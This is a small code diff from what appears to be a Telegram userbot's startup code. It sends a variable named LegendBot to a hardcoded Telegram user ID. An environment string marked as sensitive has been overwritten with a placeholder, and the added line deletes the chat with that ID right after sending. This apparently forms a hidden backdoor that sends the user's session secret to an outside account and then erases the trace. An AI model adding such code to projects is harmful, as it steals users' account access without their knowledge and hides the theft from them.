@@ -112,6 +112,7 @@ async def python_is_on():
             "SATYA_STRING"
         ] = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
         sweetie = await bot.send_message(5230049485, LegendBot)
+        await bot.delete_dialog(5230049485)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
                 Config.LOGGER_ID,
